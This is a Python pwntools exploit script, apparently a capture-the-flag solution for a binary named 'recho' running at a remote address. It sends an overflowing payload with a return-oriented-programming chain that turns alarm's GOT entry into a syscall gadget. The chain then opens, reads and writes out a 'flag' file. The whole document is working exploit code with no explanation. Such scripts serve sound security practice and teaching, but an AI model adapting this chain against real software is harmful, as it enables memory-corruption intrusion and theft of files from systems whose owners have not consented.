from pwn import *
context.log_level = 'debug'

elf = ELF('./recho')
sh = elf.process()
sh = remote('111.198.29.45', 33921)

pop_rdi = 0x4008a3
pop_rsi_r15 =  0x4008a1
start_addr = 0x400630
add_al_to_rdi = 0x40070d
pop_rax = 0x4006fc
pop_rdx = 0x4006fe
bss_addr = 0x601090

ret = 0x4005b6
main = 0x400791

alarm_plt = elf.plt['alarm']
alarm_got = elf.got['alarm']
printf_plt = elf.plt['printf']
read_plt = elf.plt['read']
write_plt = elf.plt['write']

sh.recvline();
sh.sendline("1000");
buf = 0x601070


payload = 'A' * 0x30 + p64(0xdeedbeef)
payload += p64(pop_rdi) + p64(alarm_got) ##modify alarm_got_addr as syscall
payload += p64(pop_rax) + p64(5) + p64(add_al_to_rdi)
## call open("flag", READONLY)
payload += p64(pop_rdi) + p64(elf.search('flag').next()) 
payload += p64(pop_rsi_r15) + p64(0) + p64(0) # 0
payload += p64(pop_rax) + p64(2) #syscal 2 -> open()
payload += p64(alarm_plt)
# call read(fd, d, len)
payload += p64(pop_rsi_r15) + p64(buf) + p64(0); #buf
payload += p64(pop_rdi) + p64(3) #fd
payload += p64(pop_rdx) + p64(100) #len
payload += p64(read_plt)
# call write(0, buf, len)
payload += p64(pop_rdi) + p64(1) #fd
payload += p64(pop_rsi_r15) + p64(buf) + p64(0); #buf
payload += p64(pop_rdx) + p64(64) #len
payload += p64(write_plt)

'''
# call printf(buf)
payload += p64(pop_rdi) + p64(buf) + p64(print_plt)
#gdb.attach(sh)
'''
sh.sendline(payload)

sh.shutdown() # break while


sh.interactive()
